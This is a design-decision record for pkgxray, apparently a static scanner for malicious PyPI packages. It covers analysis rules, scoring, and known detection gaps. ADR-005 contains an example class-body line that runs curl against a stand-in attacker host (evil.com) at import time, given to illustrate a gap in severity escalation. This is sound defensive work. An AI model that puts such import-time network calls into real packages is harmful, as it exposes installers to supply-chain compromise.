# Architecture Decision Records — pkgxray

ADRs document significant design decisions: what was decided, why, and what the trade-offs are. Update this file when a decision changes.

**Format:** Each ADR has a status (`Accepted` | `Superseded` | `Proposed`) and a date.

---

## ADR-001: Static AST Analysis — No Code Execution

**Status:** Accepted
**Date:** 2024 (initial design)

### Decision
All analysis is performed via `ast.parse()` on the raw source text. The package under analysis is never imported, executed, or installed.

### Rationale
- Executing arbitrary third-party code is the threat model we are defending against. Running the code to analyse it would be self-defeating.
- `ast.parse()` is safe: it parses syntax only, never evaluates semantics.
- The only network activity is the PyPI metadata fetch and archive download — both using `urllib` from the stdlib.

### Consequences
- We can only detect patterns that are visible in source code (not in compiled `.so`/`.pyd` extensions).
- Packages that gate malicious behaviour behind runtime conditions can evade detection.
- Aliased names (`import subprocess as sp`) are not tracked across statements.

---

## ADR-002: urllib-Only HTTP Client

**Status:** Accepted
**Date:** 2024 (initial design)

### Decision
`downloader.py` uses only `urllib.request` from the Python standard library. No `requests`, `httpx`, or other third-party HTTP libraries.

### Rationale
- Minimises the dependency surface of a security tool. Adding `requests` would mean pkgxray itself is subject to the same supply-chain risks it analyses.
- `urllib` is sufficient for the two API calls needed (PyPI JSON endpoint + archive download).

### Consequences
- No retry logic, connection pooling, or timeout configuration beyond what `urllib` exposes.
- SSL certificate verification relies on the system's default CA bundle via `urllib`.
- Adding proxy support or custom TLS would require more verbose code.

---

## ADR-003: Fail-Open Per Analyser

**Status:** Accepted
**Date:** 2024 (initial design)

### Decision
Every `analyzer.analyze()` call in the orchestrator is wrapped in `try/except Exception: continue`. A crash in one analyser never aborts the rest of the scan.

### Rationale
- A maliciously crafted package that exploits a bug in one analyser should not be able to suppress findings from the other seven.
- A parse error in an unusual Python file (e.g. using Python 3.13+ syntax on a 3.9 runner) should degrade gracefully, not crash the tool.

### Consequences
- Analyser bugs are silently swallowed unless tests catch them.
- There is currently no telemetry or logging when an analyser fails — failures are invisible in production.
- Future improvement: log analyser failures at DEBUG level.

---

## ADR-004: Two-Level Score Capping

**Status:** Accepted — under review
**Date:** 2024 (initial design)

### Decision
The risk score uses a two-level cap:
1. **Per-analyser cap (20 points):** No single analyser contributes more than 20 points, regardless of how many findings it produces.
2. **Global cap (100 points):** Total score is clamped to 100.

Severity weights: LOW=1, MEDIUM=3, HIGH=7, CRITICAL=15.

### Rationale
- A package that calls `os.getenv()` 100 times should not score higher than one that calls it once. Frequency of a pattern is less meaningful than breadth across risk categories.
- The per-analyser cap encourages having *many* categories of findings for a high score, rather than flooding a single category.

### Current Problem
The calibration is too aggressive. Legitimate packages that use network calls, subprocess, and environment variables in normal ways reach HIGH or CRITICAL scores. The `env_access` analyser in particular contributes disproportionately to false positives.

### Proposed Fix
- Reduce the per-analyser cap for lower-risk analysers (`env_access`, `dynamic_imports`) relative to higher-risk ones (`obfuscation`, `setup_scripts`).
- Alternatively, introduce per-analyser configurable caps instead of a single global cap.
- Recalibrate thresholds against a baseline of 20–30 known-clean packages to define what a normal score looks like.

**This ADR should be updated when the calibration is changed.**

---

## ADR-005: Severity Escalation at Module Level

**Status:** Accepted — known gap
**Date:** 2024 (initial design)

### Decision
Any dangerous call (subprocess, network, code execution) that appears at the top level of a module (outside any function or class) is automatically escalated to `CRITICAL` severity, regardless of its base severity.

### Rationale
- Module-level code runs automatically when the package is imported, requiring no further user action beyond installation.
- This is the canonical attack pattern in PyPI supply-chain attacks: placing `subprocess.run(["curl", ...])` at the top of `__init__.py`.

### Known Gap
`is_module_level()` walks upward through parent nodes and returns `False` if any ancestor is a `ClassDef`. This means code in a class body (but outside a method) is NOT classified as module-level, even though it executes when the class is defined at import time.

```python
class Foo:
    subprocess.run(["curl", "http://evil.com"])  # runs at import time, but scored as HIGH not CRITICAL
```

### Proposed Fix
Modify `is_module_level()` to treat class-body code as module-level (i.e. only return `False` for `FunctionDef` and `AsyncFunctionDef` ancestors, not `ClassDef`).

---

## ADR-006: Docker as the Canonical Test Environment

**Status:** Accepted
**Date:** 2025 (v0.2.x)

### Decision
All tests in CI run inside Docker. The Docker image is the single source of truth for the test environment. Local development should also use `docker compose run test` for PR validation.

### Rationale
- The team uses different local Python versions. Docker ensures everyone and CI runs the same interpreter.
- The Dockerfile pins `python:3.11-slim` as the primary test target, with the CI matrix also covering 3.9 and 3.12.
- Reproducibility: a test that passes in Docker will pass in CI.

### Consequences
- Slower first run (image build). Subsequent runs use Docker's layer cache.
- Developers need Docker installed. Lightweight alternatives (e.g. podman) are compatible.
- Integration tests that download real packages from PyPI require network access in the Docker container.

---

## ADR-007: Receiver-Name-Based False-Positive Mitigation

**Status:** Accepted — partially effective
**Date:** 2024 (initial design)

### Decision
Analysers that detect method calls check the *receiver* object's name before flagging. For example, `NetworkAnalyzer` only flags `.get()` calls when the receiver is in `{"requests", "httpx", "session", "client", ...}`, preventing `dict.get()` and `config.get()` from being flagged.

### Rationale
- Pure regex scanning produces an unacceptable number of false positives for common method names.
- The AST gives us the receiver as an `ast.Name` node, which we can inspect.

### Known Limitation
Receiver identification only works when the receiver is a direct `ast.Name` node (a simple variable name). If the receiver is a chained attribute access (e.g., `self.session.get(...)`), `func.value` is an `ast.Attribute`, not `ast.Name`, so `receiver` becomes an empty string and the call is **not** flagged.

This means OOP-style HTTP clients are systematically missed by `NetworkAnalyzer`. See `docs/QUANTA.md` for the full issue.

### Proposed Fix
Recurse into `ast.Attribute` chains to extract the final attribute name as a secondary receiver candidate, or check `func.attr` (the method name) independently with a wider allow-list.
